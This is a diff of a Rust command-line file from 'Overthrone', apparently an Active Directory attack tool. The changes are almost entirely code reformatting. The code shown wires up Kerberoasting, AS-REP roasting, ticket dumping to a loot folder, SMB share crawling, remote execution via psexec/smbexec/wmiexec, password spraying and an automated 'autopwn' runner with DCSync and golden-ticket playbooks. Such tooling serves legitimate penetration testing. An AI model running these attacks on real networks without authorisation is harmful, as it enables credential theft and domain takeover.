@@ -1084,7 +1084,10 @@ async fn async_main() {
             ref target,
             ref command,
         } => cmd_exec(&cli, method.clone(), target, command).await,
-        Commands::Graph { ref file, ref action } => cmd_graph(&cli, file.as_deref(), action.clone()).await,
+        Commands::Graph {
+            ref file,
+            ref action,
+        } => cmd_graph(&cli, file.as_deref(), action.clone()).await,
         Commands::Spray {
             ref password,
             ref userlist,
@@ -1103,22 +1106,29 @@ async fn async_main() {
             ldaps,
             timeout,
             playbook,
-        } => cmd_autopwn(&cli, AutoPwnArgs {
-            target: target.clone(),
-            method: method.clone(),
-            stealth,
-            dry_run,
-            max_stage,
-            adaptive,
-            q_table: q_table.clone(),
-            jitter_ms,
-            ldaps,
-            timeout,
-            playbook,
-        }).await,
-        Commands::Dump { ref target, ref source } => {
-            commands_impl::cmd_dump(&cli, target, source.clone()).await
+        } => {
+            cmd_autopwn(
+                &cli,
+                AutoPwnArgs {
+                    target: target.clone(),
+                    method: method.clone(),
+                    stealth,
+                    dry_run,
+                    max_stage,
+                    adaptive,
+                    q_table: q_table.clone(),
+                    jitter_ms,
+                    ldaps,
+                    timeout,
+                    playbook,
+                },
+            )
+            .await
         }
+        Commands::Dump {
+            ref target,
+            ref source,
+        } => commands_impl::cmd_dump(&cli, target, source.clone()).await,
         Commands::Doctor { ref checks, ref dc } => {
             commands_impl::cmd_doctor(&cli, checks.clone(), dc.as_deref()).await
         }
@@ -1151,16 +1161,18 @@ async fn async_main() {
             null_session,
         } => commands_impl::cmd_rid(&cli, start_rid, end_rid, null_session).await,
         Commands::Move { ref action } => commands_impl::cmd_move(&cli, action).await,
-        Commands::Gpp { ref file, ref cpassword } => {
-            commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await
-        }
+        Commands::Gpp {
+            ref file,
+            ref cpassword,
+        } => commands_impl::cmd_gpp(&cli, file.as_deref(), cpassword.as_deref()).await,
         Commands::Laps { ref computer } => commands_impl::cmd_laps(&cli, computer.as_deref()).await,
         Commands::Secrets { ref action } => commands_impl::cmd_secrets(action).await,
         Commands::Ntlm { ref action } => cmd_ntlm(action.clone()).await,
         Commands::Adcs { ref action } => commands_impl::cmd_adcs(&cli, action).await,
-        Commands::Shell { ref target, ref shell_type } => {
-            commands_impl::cmd_shell(target, shell_type).await
-        }
+        Commands::Shell {
+            ref target,
+            ref shell_type,
+        } => commands_impl::cmd_shell(target, shell_type).await,
         Commands::Sccm { ref action } => commands_impl::cmd_sccm(action).await,
         Commands::Scan {
             ref targets,
@@ -1528,21 +1540,16 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         KerberosAction::Roast { spn } => {
             use overthrone_core::proto::kerberos;
             // Step 1: Get a TGT
-            let tgt = match kerberos::request_tgt(
-                &dc,
-                &creds.domain,
-                &creds.username,
-                &secret,
-                use_hash,
-            )
-            .await
-            {
-                Ok(t) => t,
-                Err(e) => {
-                    banner::print_fail(&format!("TGT request failed: {}", e));
-                    return 1;
-                }
-            };
+            let tgt =
+                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
+                    .await
+                {
+                    Ok(t) => t,
+                    Err(e) => {
+                        banner::print_fail(&format!("TGT request failed: {}", e));
+                        return 1;
+                    }
+                };
             println!(
                 "{} TGT obtained for {}@{}",
                 "✓".green(),
@@ -1569,7 +1576,12 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     jitter_ms: 0,
                     tgt: None,
                 };
-                match overthrone_hunter::kerberoast::run(&hunt_config, &overthrone_hunter::kerberoast::KerberoastConfig::default()).await {
+                match overthrone_hunter::kerberoast::run(
+                    &hunt_config,
+                    &overthrone_hunter::kerberoast::KerberoastConfig::default(),
+                )
+                .await
+                {
                     Ok(result) => {
                         println!(
                             "{} Kerberoast complete: {} hashes captured",
@@ -1625,14 +1637,20 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
             use overthrone_core::proto::kerberos;
             let users: Vec<String> = if let Some(path) = userlist {
                 match std::fs::read_to_string(&path) {
-                    Ok(content) => content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect(),
+                    Ok(content) => content
+                        .lines()
+                        .map(|l| l.trim().to_string())
+                        .filter(|l| !l.is_empty())
+                        .collect(),
                     Err(e) => {
                         banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
                         return 1;
                     }
                 }
             } else {
-                banner::print_fail("--userlist required for AS-REP roast (or use 'ovt enum --target asrep' first)");
+                banner::print_fail(
+                    "--userlist required for AS-REP roast (or use 'ovt enum --target asrep' first)",
+                );
                 return 1;
             };
 
@@ -1671,14 +1689,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         }
         KerberosAction::GetTgt => {
             use overthrone_core::proto::kerberos;
-            match kerberos::request_tgt(
-                &dc,
-                &creds.domain,
-                &creds.username,
-                &secret,
-                use_hash,
-            )
-            .await
+            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
+                .await
             {
                 Ok(tgt) => {
                     println!(
@@ -1693,8 +1705,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     let _ = std::fs::create_dir_all(&loot_dir);
                     let kirbi_path = loot_dir.join(format!("{}_tgt.kirbi", creds.username));
                     if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
-                        use std::io::Write;
                         use kerberos_asn1::Asn1Object;
+                        use std::io::Write;
                         let _ = f.write_all(&tgt.ticket.build());
                         println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                     }
@@ -1709,36 +1721,27 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         KerberosAction::GetTgs { spn } => {
             use overthrone_core::proto::kerberos;
             // Get TGT first
-            let tgt = match kerberos::request_tgt(
-                &dc,
-                &creds.domain,
-                &creds.username,
-                &secret,
-                use_hash,
-            )
-            .await
-            {
-                Ok(t) => t,
-                Err(e) => {
-                    banner::print_fail(&format!("TGT request failed: {}", e));
-                    return 1;
-                }
-            };
+            let tgt =
+                match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
+                    .await
+                {
+                    Ok(t) => t,
+                    Err(e) => {
+                        banner::print_fail(&format!("TGT request failed: {}", e));
+                        return 1;
+                    }
+                };
             // Request service ticket
             match kerberos::request_service_ticket(&dc, &tgt, &spn).await {
                 Ok(st) => {
-                    println!(
-                        "{} Service ticket for {} obtained",
-                        "✓".green(),
-                        spn.cyan()
-                    );
+                    println!("{} Service ticket for {} obtained", "✓".green(), spn.cyan());
                     let loot_dir = std::path::PathBuf::from("./loot");
                     let _ = std::fs::create_dir_all(&loot_dir);
                     let safe_spn = spn.replace('/', "_");
                     let kirbi_path = loot_dir.join(format!("{}_tgs.kirbi", safe_spn));
                     if let Ok(mut f) = std::fs::File::create(&kirbi_path) {
-                        use std::io::Write;
                         use kerberos_asn1::Asn1Object;
+                        use std::io::Write;
                         let _ = f.write_all(&st.ticket.build());
                         println!("{} Saved to {}", "→".cyan(), kirbi_path.display());
                     }
@@ -1802,11 +1805,24 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
             let shares = smb
                 .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON", "print$"])
                 .await;
-            println!("\n  {:<15} {:<10} {}", "Share".bold(), "Read".bold(), "Write".bold());
+            println!(
+                "\n  {:<15} {:<10} {}",
+                "Share".bold(),
+                "Read".bold(),
+                "Write".bold()
+            );
             println!("  {}", "─".repeat(40));
             for s in &shares {
-                let read = if s.readable { "✓".green().to_string() } else { "✗".red().to_string() };
-                let write = if s.writable { "✓".green().to_string() } else { "✗".red().to_string() };
+                let read = if s.readable {
+                    "✓".green().to_string()
+                } else {
+                    "✗".red().to_string()
+                };
+                let write = if s.writable {
+                    "✓".green().to_string()
+                } else {
+                    "✗".red().to_string()
+                };
                 println!("  {:<15} {:<10} {}", s.share_name, read, write);
             }
             banner::print_success(&format!(
@@ -1828,7 +1844,12 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                 };
                 let result = smb.check_admin_access().await;
                 if result.has_admin {
-                    println!("{} {} — {}", "✓".green(), target.bold(), "ADMIN".green().bold());
+                    println!(
+                        "{} {} — {}",
+                        "✓".green(),
+                        target.bold(),
+                        "ADMIN".green().bold()
+                    );
                 } else {
                     println!("{} {} — {}", "✗".red(), target, "no admin".dimmed());
                 }
@@ -1857,14 +1878,22 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                 }
             };
 
-            let candidate_shares = &["C$", "ADMIN$", "Users", "Shares", "Public", "Data", "IT", "Backups", "Finance", "HR"];
+            let candidate_shares = &[
+                "C$", "ADMIN$", "Users", "Shares", "Public", "Data", "IT", "Backups", "Finance",
+                "HR",
+            ];
             let mut total_found = 0usize;
 
             for &share in candidate_shares {
                 if !smb.check_share_read(share).await {
                     continue;
                 }
-                println!("  {} \\\\{}\\{}", "▸".bright_black(), target.cyan(), share.yellow());
+                println!(
+                    "  {} \\\\{}\\{}",
+                    "▸".bright_black(),
+                    target.cyan(),
+                    share.yellow()
+                );
 
                 // BFS walk of the share
                 let mut queue: Vec<String> = vec![String::new()];
@@ -1881,7 +1910,9 @@ async fn cmd_smb(cli: &Cli, action: SmbAction) -> i32 {
                         } else {
                             let name_lower = entry.name.to_lowercase();
                             let matched = ext_list.is_empty()
-                                || ext_list.iter().any(|ext| name_lower.ends_with(ext.as_str()));
+                                || ext_list
+                                    .iter()
+                                    .any(|ext| name_lower.ends_with(ext.as_str()));
                             if matched {
                                 println!(
                                     "    {} \\\\{}\\{}\\{}  ({} bytes)",
@@ -2042,26 +2073,38 @@ async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) ->
     use overthrone_core::exec::{psexec, smbexec, wmiexec};
     let exec_result: Result<(bool, String), overthrone_core::OverthroneError> = match method {
         ExecMethod::PsExec => {
-            let cfg = psexec::PsExecConfig { command: command.to_string(), ..Default::default() };
-            psexec::execute(&smb, &cfg).await.map(|r| (r.success, r.output.unwrap_or_default()))
+            let cfg = psexec::PsExecConfig {
+                command: command.to_string(),
+                ..Default::default()
+            };
+            psexec::execute(&smb, &cfg)
+                .await
+                .map(|r| (r.success, r.output.unwrap_or_default()))
         }
-        ExecMethod::SmbExec => {
-            smbexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
-        }
-        ExecMethod::WmiExec => {
-            wmiexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
-        }
+        ExecMethod::SmbExec => smbexec::exec_command(&smb, command)
+            .await
+            .map(|r| (r.success, r.output)),
+        ExecMethod::WmiExec => wmiexec::exec_command(&smb, command)
+            .await
+            .map(|r| (r.success, r.output)),
         ExecMethod::WinRm => {
             // WinRM falls back to smbexec for now
-            smbexec::exec_command(&smb, command).await.map(|r| (r.success, r.output))
+            smbexec::exec_command(&smb, command)
+                .await
+                .map(|r| (r.success, r.output))
         }
         ExecMethod::Auto => {
             // Try smbexec first (most reliable), fall back to psexec
             match smbexec::exec_command(&smb, command).await {
                 Ok(r) => Ok((r.success, r.output)),
                 Err(_) => {
-                    let cfg = psexec::PsExecConfig { command: command.to_string(), ..Default::default() };
-                    psexec::execute(&smb, &cfg).await.map(|r| (r.success, r.output.unwrap_or_default()))
+                    let cfg = psexec::PsExecConfig {
+                        command: command.to_string(),
+                        ..Default::default()
+                    };
+                    psexec::execute(&smb, &cfg)
+                        .await
+                        .map(|r| (r.success, r.output.unwrap_or_default()))
                 }
             }
         }
@@ -2090,7 +2133,10 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
 
     match action {
         GraphAction::Build => {
-            println!("{}", "Building attack graph from LDAP enumeration...".bright_black());
+            println!(
+                "{}",
+                "Building attack graph from LDAP enumeration...".bright_black()
+            );
 
             // Require DC + creds for Build
             let domain = match require_dc_only_creds(cli) {
@@ -2107,12 +2153,23 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
             };
 
             let password = creds.password().unwrap_or("");
-            println!("  {} Connecting to {} as {}\\{}...",
-                "▸".bright_black(), dc.cyan(), domain.cyan(), creds.username.cyan());
+            println!(
+                "  {} Connecting to {} as {}\\{}...",
+                "▸".bright_black(),
+                dc.cyan(),
+                domain.cyan(),
+                creds.username.cyan()
+            );
 
             let mut session = match overthrone_core::proto::ldap::LdapSession::connect(
-                &dc, &domain, &creds.username, password, false,
-            ).await {
+                &dc,
+                &domain,
+                &creds.username,
+                password,
+                false,
+            )
+            .await
+            {
                 Ok(s) => s,
                 Err(e) => {
                     banner::print_fail(&format!("LDAP connection failed: {}", e));
@@ -2120,7 +2177,10 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
                 }
             };
 
-            println!("  {} Running full domain enumeration...", "▸".bright_black());
+            println!(
+                "  {} Running full domain enumeration...",
+                "▸".bright_black()
+            );
             let enumeration = match session.full_enumeration().await {
                 Ok(data) => data,
                 Err(e) => {
@@ -2131,7 +2191,8 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
             };
             let _ = session.disconnect().await;
 
-            println!("  {} Users: {}, Computers: {}, Groups: {}, Trusts: {}",
+            println!(
+                "  {} Users: {}, Computers: {}, Groups: {}, Trusts: {}",
                 "▸".bright_black(),
                 enumeration.users.len().to_string().green(),
                 enumeration.computers.len().to_string().green(),
@@ -2156,7 +2217,8 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
             }
 
             let stats = graph.stats();
-            println!("  {} Graph: {} nodes, {} edges",
+            println!(
+                "  {} Graph: {} nodes, {} edges",
                 "▸".bright_black(),
                 stats.total_nodes.to_string().green(),
                 stats.total_edges.to_string().green(),
@@ -2175,8 +2237,12 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
                 }
             };
 
-            println!("  {} Finding path: {} → {}",
-                "🗺".bright_black(), from.cyan(), to.cyan());
+            println!(
+                "  {} Finding path: {} → {}",
+                "🗺".bright_black(),
+                from.cyan(),
+                to.cyan()
+            );
 
             match graph.shortest_path(&from, &to) {
                 Ok(attack_path) => {
@@ -2206,21 +2272,24 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
             };
 
             // Extract domain from graph metadata, or guess from the 'from' node
-            let domain = graph.metadata()
-                .get("domain")
-                .cloned()
-                .unwrap_or_else(|| {
-                    // Try to extract domain from "user@DOMAIN" format
-                    from.split('@').nth(1).unwrap_or("").to_string()
-                });
+            let domain = graph.metadata().get("domain").cloned().unwrap_or_else(|| {
+                // Try to extract domain from "user@DOMAIN" format
+                from.split('@').nth(1).unwrap_or("").to_string()
+            });
 
             if domain.is_empty() {
-                banner::print_fail("Cannot determine domain. Ensure graph has domain metadata or use USER@DOMAIN format.");
+                banner::print_fail(
+                    "Cannot determine domain. Ensure graph has domain metadata or use USER@DOMAIN format.",
+                );
                 return 1;
             }
 
-            println!("  {} Finding paths to Domain Admins from {} in {}",
-                "🗺".bright_black(), from.cyan(), domain.cyan());
+            println!(
+                "  {} Finding paths to Domain Admins from {} in {}",
+                "🗺".bright_black(),
+                from.cyan(),
+                domain.cyan()
+            );
 
             let paths = graph.paths_to_da(&from, &domain);
             if paths.is_empty() {
@@ -2230,8 +2299,13 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
 
             println!();
             for (i, attack_path) in paths.iter().enumerate() {
-                println!("  {} Path #{} (cost: {}, hops: {})",
-                    "→".green(), i + 1, attack_path.total_cost, attack_path.hop_count);
+                println!(
+                    "  {} Path #{} (cost: {}, hops: {})",
+                    "→".green(),
+                    i + 1,
+                    attack_path.total_cost,
+                    attack_path.hop_count
+                );
                 println!("{}", attack_path);
             }
             banner::print_success(&format!("{} path(s) to Domain Admins found", paths.len()));
@@ -2265,8 +2339,12 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
                 println!();
                 println!("  {} High-Value Targets (top 10):", "🎯".bright_black());
                 for (name, node_type, inbound) in &hvt {
-                    println!("    {} ({:?}) — {} inbound edges",
-                        name.yellow(), node_type, inbound);
+                    println!(
+                        "    {} ({:?}) — {} inbound edges",
+                        name.yellow(),
+                        node_type,
+                        inbound
+                    );
                 }
             }
 
@@ -2284,10 +2362,16 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
             };
 
             let json = if bloodhound {
-                println!("  {} Exporting in BloodHound-compatible format...", "💾".bright_black());
+                println!(
+                    "  {} Exporting in BloodHound-compatible format...",
+                    "💾".bright_black()
+                );
                 graph.export_bloodhound()
             } else {
-                println!("  {} Exporting in Overthrone JSON format...", "💾".bright_black());
+                println!(
+                    "  {} Exporting in Overthrone JSON format...",
+                    "💾".bright_black()
+                );
                 graph.export_json()
             };
 
@@ -2297,7 +2381,11 @@ async fn cmd_graph(cli: &Cli, graph_file: Option<&str>, action: GraphAction) -> 
                         banner::print_fail(&format!("Failed to write {}: {}", output, e));
                         return 1;
                     }
-                    banner::print_success(&format!("Graph exported to {} ({} bytes)", output, data.len()));
+                    banner::print_success(&format!(
+                        "Graph exported to {} ({} bytes)",
+                        output,
+                        data.len()
+                    ));
                 }
                 Err(e) => {
                     banner::print_fail(&format!("Export failed: {}", e));
@@ -2377,7 +2465,9 @@ async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, jitter
                     );
                     locked_out += 1;
                     if locked_out >= 3 {
-                        banner::print_fail("3+ lockouts detected — aborting spray to avoid mass lockout");
+                        banner::print_fail(
+                            "3+ lockouts detected — aborting spray to avoid mass lockout",
+                        );
                         return 1;
                     }
                 } else {
@@ -2444,7 +2534,19 @@ struct AutoPwnArgs {
 
 // cmd_autopwn — wired to overthrone-pilot runner with Q-learning
 async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
-    let AutoPwnArgs { ref target, method, stealth, dry_run, max_stage, adaptive, ref q_table, jitter_ms, ldaps, timeout, playbook } = args;
+    let AutoPwnArgs {
+        ref target,
+        method,
+        stealth,
+        dry_run,
+        max_stage,
+        adaptive,
+        ref q_table,
+        jitter_ms,
+        ldaps,
+        timeout,
+        playbook,
+    } = args;
     banner::print_module_banner("AUTONOMOUS ATTACK");
 
     let creds_cli = match require_creds(cli) {
@@ -2458,21 +2560,21 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
 
     // Map CLI exec method to pilot ExecMethod
     let pilot_exec = match method {
-        ExecMethod::Auto   => overthrone_pilot::runner::ExecMethod::Auto,
+        ExecMethod::Auto => overthrone_pilot::runner::ExecMethod::Auto,
         ExecMethod::PsExec => overthrone_pilot::runner::ExecMethod::PsExec,
         ExecMethod::SmbExec => overthrone_pilot::runner::ExecMethod::SmbExec,
         ExecMethod::WmiExec => overthrone_pilot::runner::ExecMethod::WmiExec,
-        ExecMethod::WinRm   => overthrone_pilot::runner::ExecMethod::WinRm,
+        ExecMethod::WinRm => overthrone_pilot::runner::ExecMethod::WinRm,
     };
 
     // Map max stage
     let pilot_stage = match max_stage {
         MaxStageArg::Enumerate => overthrone_pilot::runner::Stage::Enumerate,
-        MaxStageArg::Attack    => overthrone_pilot::runner::Stage::Attack,
-        MaxStageArg::Escalate  => overthrone_pilot::runner::Stage::Escalate,
-        MaxStageArg::Lateral   => overthrone_pilot::runner::Stage::Lateral,
-        MaxStageArg::Loot      => overthrone_pilot::runner::Stage::Loot,
-        MaxStageArg::Cleanup   => overthrone_pilot::runner::Stage::Cleanup,
+        MaxStageArg::Attack => overthrone_pilot::runner::Stage::Attack,
+        MaxStageArg::Escalate => overthrone_pilot::runner::Stage::Escalate,
+        MaxStageArg::Lateral => overthrone_pilot::runner::Stage::Lateral,
+        MaxStageArg::Loot => overthrone_pilot::runner::Stage::Loot,
+        MaxStageArg::Cleanup => overthrone_pilot::runner::Stage::Cleanup,
     };
 
     // Build pilot credentials
@@ -2506,7 +2608,7 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
         adaptive_mode: match adaptive {
             AdaptiveModeArg::Heuristic => overthrone_pilot::qlearner::AdaptiveMode::Heuristic,
             AdaptiveModeArg::Qlearning => overthrone_pilot::qlearner::AdaptiveMode::QLearning,
-            AdaptiveModeArg::Hybrid    => overthrone_pilot::qlearner::AdaptiveMode::Hybrid,
+            AdaptiveModeArg::Hybrid => overthrone_pilot::qlearner::AdaptiveMode::Hybrid,
         },
         #[cfg(feature = "qlearn")]
         q_table_path: std::path::PathBuf::from(q_table),
@@ -2520,35 +2622,42 @@ async fn cmd_autopwn(cli: &Cli, args: AutoPwnArgs) -> i32 {
     println!(
         "{} Stealth:   {}",
         "🥷".bright_black(),
-        if stealth { "ON".green() } else { "OFF".yellow() }
+        if stealth {
+            "ON".green()
+        } else {
+            "OFF".yellow()
+        }
     );
     println!(
         "{} Dry Run:   {}",
         "📝".bright_black(),
-        if dry_run { "YES".yellow() } else { "NO".dimmed() }
+        if dry_run {
+            "YES".yellow()
+        } else {
+            "NO".dimmed()
+        }
     );
     println!();
 
     // If a playbook was requested, run that instead of goal-driven autopwn
     if let Some(pb) = playbook {
         let playbook_id = match pb {
-            PlaybookArg::FullRecon       => overthrone_pilot::playbook::PlaybookId::FullRecon,
-            PlaybookArg::RoastAndCrack   => overthrone_pilot::playbook::PlaybookId::RoastAndCrack,
+            PlaybookArg::FullRecon => overthrone_pilot::playbook::PlaybookId::FullRecon,
+            PlaybookArg::RoastAndCrack => overthrone_pilot::playbook::PlaybookId::RoastAndCrack,
             PlaybookArg::DelegationAbuse => overthrone_pilot::playbook::PlaybookId::DelegationAbuse,
-            PlaybookArg::RbcdChain       => overthrone_pilot::playbook::PlaybookId::RbcdChain,
-            PlaybookArg::CoerceAndRelay  => overthrone_pilot::playbook::PlaybookId::CoerceAndRelay,
-            PlaybookArg::LateralPivot    => overthrone_pilot::playbook::PlaybookId::LateralPivot,
-            PlaybookArg::DcSyncDump      => overthrone_pilot::playbook::PlaybookId::DcSyncDump,
-            PlaybookArg::GoldenTicket    => overthrone_pilot::playbook::PlaybookId::GoldenTicketPersist,
-            PlaybookArg::FullAutoPwn     => overthrone_pilot::playbook::PlaybookId::FullAutoPwn,
+            PlaybookArg::RbcdChain => overthrone_pilot::playbook::PlaybookId::RbcdChain,
+            PlaybookArg::CoerceAndRelay => overthrone_pilot::playbook::PlaybookId::CoerceAndRelay,
+            PlaybookArg::LateralPivot => overthrone_pilot::playbook::PlaybookId::LateralPivot,
+            PlaybookArg::DcSyncDump => overthrone_pilot::playbook::PlaybookId::DcSyncDump,
+            PlaybookArg::GoldenTicket => {
+                overthrone_pilot::playbook::PlaybookId::GoldenTicketPersist
+            }
+            PlaybookArg::FullAutoPwn => overthrone_pilot::playbook::PlaybookId::FullAutoPwn,
         };
         banner::print_info(&format!("Running playbook: {}", playbook_id));
         let result = overthrone_pilot::runner::run_playbook(playbook_id, &config).await;
         if result.domain_admin_achieved {
-            banner::print_da_achieved(
-                result.state.da_user.as_deref().unwrap_or("unknown"),
-                &dc,
-            );
+            banner::print_da_achieved(result.state.da_user.as_deref().unwrap_or("unknown"), &dc);
             return 0;
         }
         banner::print_info("Playbook completed");
